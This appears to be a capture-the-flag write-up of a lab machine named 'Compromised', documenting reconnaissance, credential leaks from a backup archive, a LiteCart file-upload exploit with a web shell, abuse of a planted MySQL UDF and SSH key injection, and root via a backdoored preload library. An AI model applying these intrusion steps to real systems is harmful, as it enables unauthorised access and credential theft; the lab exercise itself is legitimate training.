---
host:Compromised
ip:10.129.2.19
ipv6:
os: Ubuntu Linux
kernel:
arch:
domain:
domain.fqdn:
domain.sid:
user:b3473551de7e3ce0dc41304a6129cecc
root:9d31a3a78b2f76b8deafcfc3fa78a2d7
app:Apache 2.4.29
app:OpenSSH 7.6p1
app:LiteCart 2.1.2
vuln:E-DB:45267 - Authenticated file upload
cred:mysql:root:changethis
cred:litecart:admin:theNextGenSt0r3!~
hash:admin:44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4
---

# System: Compromised (10.129.2.19)


## Enumeration

**Enumerate common ports**
> sudo nmap -n -T4 --top-ports=50 10.129.2.19 -oG enum/nmap.top50.grep.txt -oN enum/nmap.top50.txt
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Enumerate all ports**
> sudo nmap -sV -n -T4 -p- 10.129.2.19 -oG enum/nmap.tcp.grep.txt -oN enum/nmap.tcp.txt
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```


### Port 80 - HTTP server

Default vhost - compromised.htb
LiteCart
email:admin@compromised.htb
vuln:E-DB:45267 - Authenticated file upload - No credentials yet
http://compromised.htb/shop/robots.txt
http://compromised.htb/shop/en/feeds/sitemap.xml


#### gobuster

> gobuster dir -u 'http://compromised.htb/' -w tools/common.txt -x php -o enum/gobuster.compromised.htb.txt
```
/backup (Status: 301)
/server-status (Status: 403)
```

http://compromised.htb/backup/a.tar.gz


#### a.tar.gz

> tar zxf a.tar.gz
*NOT a gzip file*
> tar xf a.tar.gz
/.sh.php - 404 on server

/includes/config.inc.php
cred:mysql:root:changethis
Password encryption salt:
```
kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI
```

/admin/login.php
```php
//file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```
Debug during development?

http://compromised.htb/shop/admin/.log2301c9430d8593ae.txt
```
User: admin Passwd: theNextGenSt0r3!~
```
cred:litecart:admin:theNextGenSt0r3!~


## Foothold

### E-DB:45267

Convert to python3
> 2to3-2.7 -w 45267.py
```
python3 45267.py -t 'http://compromised.htb/shop/admin/' -u 'admin' -p 'theNextGenSt0r3!~'
```
```
Shell => http://compromised.htb/shop/admin/../vqmod/xml/SDQLQ.php?c=id
```
Blank response (200 - file uploaded corrected)
Uploaded phpinfo();
disabled_functions() include all shell commands
Uploaded weevely shell


## Exploitation

### Enumeration

/etc/passwd
```
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
```

/var/www/html/shop/includes/config.inc.php
```
// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');
```
cred:mysql:root:changethis


### Database - localhost/ecom

> SELECT * FROM lc_users;
```
| 1 | 1 | admin | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |  | 10.10.14.88 | 10.10.14.88 | 0 | 58 | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | 2021-01-26 20:06:05 | 2021-01-26 20:06:04 | 2020-05-28 00:39:04 | 2020-05-28 00:39:04 |
```
hash:admin:44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4

LOAD_FILE() - does not work
INTO OUTFILE - does not work
Checked existing UDF libraries:
> ls -al /usr/lib/mysql/plugin/
```
-rw-r--r-- 1 root root  16296 Apr 29  2020 libmysql.so
```

libmysql is not a UDF...
> SELECT * FROM mysql.func;
```
+----------+---+-------------+----------+
| exec_cmd | 0 | libmysql.so | function |
+----------+---+-------------+----------+
```

> SELECT exec_cmd('id');
```
uid=111(mysql) gid=113(mysql) groups=113(mysql)
```


### mysql user

Via exec_cmd() UDF
```
ls -al ~/.ssh | grep authorized_keys
echo 'SSHKEY' >> ~/.ssh/authorized_keys
```
> ssh mysql@compromised.htb
> ls -al
```
-rw-------  1 mysql mysql     1680 May  8  2020 ca-key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 ca.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 client-cert.pem
-rw-------  1 mysql mysql     1676 May  8  2020 client-key.pem
-rw-r--r--  1 root  root         0 May  8  2020 debian-5.7.flag
drwx------  3 mysql mysql     4096 May  9  2020 .gnupg
-rw-------  1 mysql mysql     1680 May  8  2020 private_key.pem
-rw-r--r--  1 mysql mysql      452 May  8  2020 public_key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 server-cert.pem
-rw-------  1 mysql mysql     1680 May  8  2020 server-key.pem
-r--r-----  1 root  mysql   787180 May 13  2020 strace-log.dat
```
> grep -i 'pass' strace-log.dat
```
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
```

### Lateral move
> su sysadmin
```3*NLJE32I$Fe```
*Works!*

> ls -al
```
-r--r----- 1 root sysadmin   33 Jan 26 21:02 user.txt
```
> cat user.txt
```
b3473551de7e3ce0dc41304a6129cecc
```


## Privilege Escalation

> cat /etc/ld.so.preload
```
/lib/x86_64-linux-gnu/libdate.so
```
> objdump -T /lib/x86_64-linux-gnu/libdate.so
```
0000000000001060 g    DF .text	00000000000000cd  Base        read
```
*read() syscall is being hooked*

> objdump -s -j .rodata /lib/x86_64-linux-gnu/libdate.so
```
 2000 72656164 002f6269 6e2f7368 00        read./bin/sh.
```

> objdump -M intel -d /lib/x86_64-linux-gnu/libdate.so
*dlsym() for real read()*
*Password set 1 byte at a time into buffer*
*if password is in read() buffer, setuid/setgid/execve('/bin/sh')*

password in hex: 32776b654f5534736a7638346f6b2f

> python3 -c "print(bytearray.fromhex('32776b654f5534736a7638346f6b2f').decode())"
*This crashes the server connection - a good sign*
```
2wkeOU4sjv84ok/
```

> passwd
> 2wkeOU4sjv84ok/
> id
```
uid=0(root) gid=0(root) groups=0(root),113(mysql)
```
> ls -al /root
```
-r--------  1 root root   33 Jan 26 21:02 root.txt
```
> cat /root/root.txt
```
9d31a3a78b2f76b8deafcfc3fa78a2d7
```
